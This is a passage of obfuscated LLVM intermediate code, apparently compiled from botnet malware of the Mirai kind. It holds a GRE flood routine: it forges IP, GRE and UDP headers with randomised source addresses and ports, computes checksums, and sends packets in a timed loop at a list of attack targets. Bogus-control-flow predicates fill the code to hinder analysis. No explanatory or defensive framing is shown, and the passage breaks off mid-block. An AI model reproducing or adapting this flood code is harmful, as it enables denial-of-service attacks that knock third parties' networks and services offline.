  %169 = load i32, i32* @y.20
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %167
  %176 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 4
  store i16 %176, i16* %178, align 2
  %179 = load i32, i32* @x.19
  %180 = load i32, i32* @y.20
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %187

; <label>:187:                                    ; preds = %originalBBpart24, %117
  %188 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 6
  store i8 47, i8* %189, align 1
  %190 = load i32, i32* %23, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 8
  store i32 %190, i32* %192, align 4
  %193 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %194 = load i32, i32* %11, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i64 %195
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i32 0, i32 1
  %198 = load i32, i32* %197, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 9
  store i32 %198, i32* %200, align 4
  %201 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %202 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %203 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %202, i32 0, i32 1
  store i16 %201, i16* %203, align 2
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = bitcast %struct.iphdr* %204 to i8*
  %206 = load i8, i8* %205, align 4
  %207 = and i8 %206, 15
  %208 = or i8 %207, 64
  store i8 %208, i8* %205, align 4
  %209 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %210 = bitcast %struct.iphdr* %209 to i8*
  %211 = load i8, i8* %210, align 4
  %212 = and i8 %211, -16
  %213 = or i8 %212, 5
  store i8 %213, i8* %210, align 4
  %214 = load i8, i8* %14, align 1
  %215 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 1
  store i8 %214, i8* %216, align 1
  %217 = load i32, i32* %20, align 4
  %218 = sext i32 %217 to i64
  %219 = add i64 28, %218
  %220 = trunc i64 %219 to i16
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 2
  store i16 %221, i16* %223, align 2
  %224 = load i16, i16* %15, align 2
  %225 = zext i16 %224 to i32
  %226 = xor i32 %225, -1
  %227 = trunc i32 %226 to i16
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 3
  store i16 %228, i16* %230, align 4
  %231 = load i8, i8* %16, align 1
  %232 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 5
  store i8 %231, i8* %233, align 4
  %234 = load i8, i8* %17, align 1
  %235 = icmp ne i8 %234, 0
  br i1 %235, label %236, label %240

; <label>:236:                                    ; preds = %187
  %237 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %238 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 4
  store i16 %237, i16* %239, align 2
  br label %240

; <label>:240:                                    ; preds = %236, %187
  %241 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 6
  store i8 17, i8* %242, align 1
  %243 = call i32 @rand_next()
  %244 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %246 = load i8, i8* %22, align 1
  %247 = icmp ne i8 %246, 0
  br i1 %247, label %248, label %270

; <label>:248:                                    ; preds = %240
  %249 = load i32, i32* @x.19
  %250 = load i32, i32* @y.20
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %248
  %257 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 9
  %259 = load i32, i32* %258, align 4
  %260 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 9
  store i32 %259, i32* %261, align 4
  %262 = load i32, i32* @x.19
  %263 = load i32, i32* @y.20
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %278

; <label>:270:                                    ; preds = %240
  %271 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 8
  %273 = load i32, i32* %272, align 4
  %274 = sub i32 %273, 1024
  %275 = xor i32 %274, -1
  %276 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 9
  store i32 %275, i32* %277, align 4
  br label %278

; <label>:278:                                    ; preds = %270, %originalBBpart28
  %279 = load i16, i16* %18, align 2
  %280 = call zeroext i16 @htons(i16 zeroext %279) #7
  %281 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 0
  store i16 %280, i16* %282, align 2
  %283 = load i16, i16* %19, align 2
  %284 = call zeroext i16 @htons(i16 zeroext %283) #7
  %285 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %286 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %285, i32 0, i32 1
  store i16 %284, i16* %286, align 2
  %287 = load i32, i32* %20, align 4
  %288 = sext i32 %287 to i64
  %289 = add i64 8, %288
  %290 = trunc i64 %289 to i16
  %291 = call zeroext i16 @htons(i16 zeroext %290) #7
  %292 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %293 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %292, i32 0, i32 2
  store i16 %291, i16* %293, align 2
  br label %294

; <label>:294:                                    ; preds = %278
  %295 = load i32, i32* %11, align 4
  %296 = add nsw i32 %295, 1
  store i32 %296, i32* %11, align 4
  br label %96

; <label>:297:                                    ; preds = %originalBBpart2
  br label %298

; <label>:298:                                    ; preds = %658, %297
  %299 = load i32, i32* @x.19
  %300 = load i32, i32* @y.20
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %298
  store i32 0, i32* %11, align 4
  %307 = load i32, i32* @x.19
  %308 = load i32, i32* @y.20
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %315

; <label>:315:                                    ; preds = %633, %originalBBpart212
  %316 = load i32, i32* %11, align 4
  %317 = load i8, i8* %7, align 1
  %318 = zext i8 %317 to i32
  %319 = icmp slt i32 %316, %318
  br i1 %319, label %320, label %636

; <label>:320:                                    ; preds = %315
  %321 = load i32, i32* @x.19
  %322 = load i32, i32* @y.20
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %320
  %329 = load i8**, i8*** %13, align 8
  %330 = load i32, i32* %11, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i8*, i8** %329, i64 %331
  %333 = load i8*, i8** %332, align 8
  store i8* %333, i8** %29, align 8
  %334 = load i8*, i8** %29, align 8
  %335 = bitcast i8* %334 to %struct.iphdr*
  store %struct.iphdr* %335, %struct.iphdr** %30, align 8
  %336 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i64 1
  %338 = bitcast %struct.iphdr* %337 to %struct.grehdr*
  store %struct.grehdr* %338, %struct.grehdr** %31, align 8
  %339 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %340 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %339, i64 1
  %341 = bitcast %struct.grehdr* %340 to %struct.iphdr*
  store %struct.iphdr* %341, %struct.iphdr** %32, align 8
  %342 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i64 1
  %344 = bitcast %struct.iphdr* %343 to %struct.udphdr*
  store %struct.udphdr* %344, %struct.udphdr** %33, align 8
  %345 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %346 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %345, i64 1
  %347 = bitcast %struct.udphdr* %346 to i8*
  store i8* %347, i8** %34, align 8
  %348 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %349 = load i32, i32* %11, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %348, i64 %350
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %351, i32 0, i32 2
  %353 = load i8, i8* %352, align 4
  %354 = zext i8 %353 to i32
  %355 = icmp slt i32 %354, 32
  %356 = load i32, i32* @x.19
  %357 = load i32, i32* @y.20
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %355, label %364, label %401

; <label>:364:                                    ; preds = %originalBBpart216
  %365 = load i32, i32* @x.19
  %366 = load i32, i32* @y.20
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %364
  %373 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %374 = load i32, i32* %11, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i32 0, i32 1
  %378 = load i32, i32* %377, align 4
  %379 = call i32 @ntohl(i32 %378) #7
  %380 = call i32 @rand_next()
  %381 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %382 = load i32, i32* %11, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i32 0, i32 2
  %386 = load i8, i8* %385, align 4
  %387 = zext i8 %386 to i32
  %388 = lshr i32 %380, %387
  %389 = add i32 %379, %388
  %390 = call i32 @htonl(i32 %389) #7
  %391 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 9
  store i32 %390, i32* %392, align 4
  %393 = load i32, i32* @x.19
  %394 = load i32, i32* @y.20
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %401

; <label>:401:                                    ; preds = %originalBBpart227, %originalBBpart216
  %402 = load i32, i32* @x.19
  %403 = load i32, i32* @y.20
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %401
  %410 = load i32, i32* %23, align 4
  %411 = icmp eq i32 %410, -1
  %412 = load i32, i32* @x.19
  %413 = load i32, i32* @y.20
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %411, label %420, label %424

; <label>:420:                                    ; preds = %originalBBpart231
  %421 = call i32 @rand_next()
  %422 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 8
  store i32 %421, i32* %423, align 4
  br label %424

; <label>:424:                                    ; preds = %420, %originalBBpart231
  %425 = load i32, i32* @x.19
  %426 = load i32, i32* @y.20
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %424
  %433 = load i16, i16* %15, align 2
  %434 = zext i16 %433 to i32
  %435 = icmp eq i32 %434, 65535
  %436 = load i32, i32* @x.19
  %437 = load i32, i32* @y.20
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %435, label %444, label %459

; <label>:444:                                    ; preds = %originalBBpart235
  %445 = call i32 @rand_next()
  %446 = and i32 %445, 65535
  %447 = trunc i32 %446 to i16
  %448 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 3
  store i16 %447, i16* %449, align 4
  %450 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %450, i32 0, i32 3
  %452 = load i16, i16* %451, align 4
  %453 = zext i16 %452 to i32
  %454 = sub nsw i32 %453, 1000
  %455 = xor i32 %454, -1
  %456 = trunc i32 %455 to i16
  %457 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %458 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %457, i32 0, i32 3
  store i16 %456, i16* %458, align 4
  br label %459

; <label>:459:                                    ; preds = %444, %originalBBpart235
  %460 = load i16, i16* %18, align 2
  %461 = zext i16 %460 to i32
  %462 = icmp eq i32 %461, 65535
  br i1 %462, label %463, label %469

; <label>:463:                                    ; preds = %459
  %464 = call i32 @rand_next()
  %465 = and i32 %464, 65535
  %466 = trunc i32 %465 to i16
  %467 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %468 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %467, i32 0, i32 0
  store i16 %466, i16* %468, align 2
  br label %469

; <label>:469:                                    ; preds = %463, %459
  %470 = load i16, i16* %19, align 2
  %471 = zext i16 %470 to i32
  %472 = icmp eq i32 %471, 65535
  br i1 %472, label %473, label %495

; <label>:473:                                    ; preds = %469
  %474 = load i32, i32* @x.19
  %475 = load i32, i32* @y.20
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %473
  %482 = call i32 @rand_next()
  %483 = and i32 %482, 65535
  %484 = trunc i32 %483 to i16
  %485 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %486 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %485, i32 0, i32 1
  store i16 %484, i16* %486, align 2
  %487 = load i32, i32* @x.19
  %488 = load i32, i32* @y.20
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBBpart247, label %originalBB37alteredBB

originalBBpart247:                                ; preds = %originalBB37
  br label %495

; <label>:495:                                    ; preds = %originalBBpart247, %469
  %496 = load i32, i32* @x.19
  %497 = load i32, i32* @y.20
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %495
  %504 = load i8, i8* %22, align 1
  %505 = icmp ne i8 %504, 0
  %506 = load i32, i32* @x.19
  %507 = load i32, i32* @y.20
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %505, label %518, label %514

; <label>:514:                                    ; preds = %originalBBpart251
  %515 = call i32 @rand_next()
  %516 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %517 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %516, i32 0, i32 9
  store i32 %515, i32* %517, align 4
  br label %540

; <label>:518:                                    ; preds = %originalBBpart251
  %519 = load i32, i32* @x.19
  %520 = load i32, i32* @y.20
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %518
  %527 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i32 0, i32 9
  %529 = load i32, i32* %528, align 4
  %530 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 9
  store i32 %529, i32* %531, align 4
  %532 = load i32, i32* @x.19
  %533 = load i32, i32* @y.20
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %540

; <label>:540:                                    ; preds = %originalBBpart255, %514
  %541 = load i8, i8* %21, align 1
  %542 = icmp ne i8 %541, 0
  br i1 %542, label %543, label %566

; <label>:543:                                    ; preds = %540
  %544 = load i32, i32* @x.19
  %545 = load i32, i32* @y.20
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %543
  %552 = load i8*, i8** %34, align 8
  %553 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %552, i32 %553)
  %554 = load i8*, i8** %34, align 8
  %555 = load i32, i32* %20, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds i8, i8* %554, i64 %556
  store i8 0, i8* %557, align 1
  %558 = load i32, i32* @x.19
  %559 = load i32, i32* @y.20
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %566

; <label>:566:                                    ; preds = %originalBBpart259, %540
  %567 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %568 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %567, i32 0, i32 7
  store i16 0, i16* %568, align 2
  %569 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %570 = bitcast %struct.iphdr* %569 to i16*
  %571 = call zeroext i16 @checksum_generic(i16* %570, i32 20)
  %572 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %573 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %572, i32 0, i32 7
  store i16 %571, i16* %573, align 2
  %574 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 7
  store i16 0, i16* %575, align 2
  %576 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %577 = bitcast %struct.iphdr* %576 to i16*
  %578 = call zeroext i16 @checksum_generic(i16* %577, i32 20)
  %579 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 7
  store i16 %578, i16* %580, align 2
  %581 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %582 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %581, i32 0, i32 3
  store i16 0, i16* %582, align 2
  %583 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %584 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %585 = bitcast %struct.udphdr* %584 to i8*
  %586 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %587 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %586, i32 0, i32 2
  %588 = load i16, i16* %587, align 2
  %589 = load i32, i32* %20, align 4
  %590 = sext i32 %589 to i64
  %591 = add i64 8, %590
  %592 = trunc i64 %591 to i32
  %593 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %588, i32 %592)
  %594 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %595 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %594, i32 0, i32 3
  store i16 %593, i16* %595, align 2
  %596 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %597 = load i32, i32* %11, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i64 %598
  %600 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i32 0, i32 0
  %601 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %600, i32 0, i32 0
  store i16 2, i16* %601, align 4
  %602 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %603 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %602, i32 0, i32 9
  %604 = load i32, i32* %603, align 4
  %605 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %606 = load i32, i32* %11, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %605, i64 %607
  %609 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i32 0, i32 0
  %610 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %609, i32 0, i32 2
  %611 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %610, i32 0, i32 0
  store i32 %604, i32* %611, align 4
  %612 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %613 = load i32, i32* %11, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %612, i64 %614
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i32 0, i32 0
  %617 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %616, i32 0, i32 1
  store i16 0, i16* %617, align 2
  %618 = load i32, i32* %12, align 4
  %619 = load i8*, i8** %29, align 8
  %620 = load i32, i32* %20, align 4
  %621 = sext i32 %620 to i64
  %622 = add i64 52, %621
  %623 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %624 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %625 = load i32, i32* %11, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %624, i64 %626
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %627, i32 0, i32 0
  %629 = bitcast %struct.sockaddr_in* %628 to %struct.sockaddr*
  store %struct.sockaddr* %629, %struct.sockaddr** %623, align 8
  %630 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %631 = load %struct.sockaddr*, %struct.sockaddr** %630, align 8
  %632 = call i64 @sendto(i32 %618, i8* %619, i64 %622, i32 16384, %struct.sockaddr* %631, i32 16)
  br label %633

; <label>:633:                                    ; preds = %566
  %634 = load i32, i32* %11, align 4
  %635 = add nsw i32 %634, 1
  store i32 %635, i32* %11, align 4
  br label %315

; <label>:636:                                    ; preds = %315
  %637 = call i64 @time(i64* null) #6
  %638 = load i32, i32* %24, align 4
  %639 = sext i32 %638 to i64
  %640 = icmp sgt i64 %637, %639
  br i1 %640, label %641, label %658

; <label>:641:                                    ; preds = %636
  %642 = load i32, i32* @x.19
  %643 = load i32, i32* @y.20
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %641
  %650 = load i32, i32* @x.19
  %651 = load i32, i32* @y.20
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %659

; <label>:658:                                    ; preds = %636
  br label %298

; <label>:659:                                    ; preds = %originalBBpart263, %92, %86
  %660 = load i32, i32* @x.19
  %661 = load i32, i32* @y.20
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %659
  %668 = load i32, i32* @x.19
  %669 = load i32, i32* @y.20
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %96
  %676 = load i32, i32* %11, align 4
  %677 = load i8, i8* %7, align 1
  %678 = zext i8 %677 to i32
  %679 = icmp slt i32 %676, %678
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %167
  %680 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %681 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %682 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %681, i32 0, i32 4
  store i16 %680, i16* %682, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %248
  %683 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %684 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %683, i32 0, i32 9
  %685 = load i32, i32* %684, align 4
  %686 = load %struct.iphdr*, %struct.iphdr** %27, align 8
